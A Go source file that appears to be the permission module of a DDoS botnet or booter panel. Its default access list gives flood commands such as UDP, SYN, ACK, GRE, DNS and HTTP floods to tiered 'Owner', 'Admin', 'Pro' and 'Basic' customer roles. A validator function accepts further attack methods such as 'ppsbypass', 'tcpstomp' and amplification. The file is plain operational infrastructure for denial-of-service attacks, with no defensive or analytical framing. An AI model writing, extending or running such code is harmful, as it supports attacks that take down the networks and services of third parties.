package main

import (
	"encoding/json"
	"os"
	"strings"
	"sync"
)

type aclConfig struct {
	Methods map[string][]string `json:"method_permissions"`
}

var (
	permissions *aclConfig
	aclMu       sync.RWMutex
)

func loadACL() error {
	raw, err := os.ReadFile(rbacPath)
	if err != nil {
		def := aclConfig{Methods: map[string][]string{
			"!udpsmart":  {"Owner", "Admin", "Pro", "Basic"},
			"!udpflood":  {"Owner", "Admin", "Pro", "Basic"},
			"!tcpflood":  {"Owner", "Admin", "Pro"},
			"!synflood":  {"Owner", "Admin", "Pro"},
			"!ackflood":  {"Owner", "Admin"},
			"!greflood":  {"Owner", "Admin"},
			"!dns":       {"Owner", "Admin"},
			"!http":      {"Owner", "Admin", "Pro", "Basic"},
			"!reinstall": {"Owner"},
		}}
		out, _ := json.MarshalIndent(def, "", "  ")
		os.WriteFile(rbacPath, out, 0600)
		aclMu.Lock()
		permissions = &def
		aclMu.Unlock()
		return nil
	}
	var cfg aclConfig
	if err := json.Unmarshal(raw, &cfg); err != nil {
		return err
	}
	aclMu.Lock()
	permissions = &cfg
	aclMu.Unlock()
	return nil
}

func isValidMethod(m string) bool {
	aclMu.RLock()
	defer aclMu.RUnlock()
	_, ok := permissions.Methods[m]
	return ok
}

func getPermissions() map[string][]string {
	aclMu.RLock()
	defer aclMu.RUnlock()
	cp := make(map[string][]string)
	for k, v := range permissions.Methods {
		cp[k] = v
	}
	return cp
}

func setPermissions(method string, levels []string) error {
	aclMu.Lock()
	permissions.Methods[method] = levels
	aclMu.Unlock()
	out, err := json.MarshalIndent(permissions, "", "  ")
	if err != nil {
		return err
	}
	return os.WriteFile(rbacPath, out, 0600)
}

func allRoles() []string { return []string{"Owner", "Admin", "Pro", "Basic"} }

func isValidCmd(method string) bool {
	m := strings.ToLower(strings.TrimSpace(method))
	valid := map[string]bool{
		"udp": true, "!udp": true, "udpsmart": true, "!udpsmart": true,
		"tcp": true, "!tcp": true, "syn": true, "!syn": true,
		"ack": true, "!ack": true, "gre": true, "!gre": true,
		"vse": true, "!vse": true, "xmas": true, "!xmas": true,
		"pps": true, "ppsbypass": true, "!pps": true,
		"stomp": true, "tcpstomp": true, "!stomp": true,
		"reinstall": true, "!rst": true, "!amp": true, "!reinstall": true,
		"stop": true, "STOP": true,
	}
	return valid[m]
}
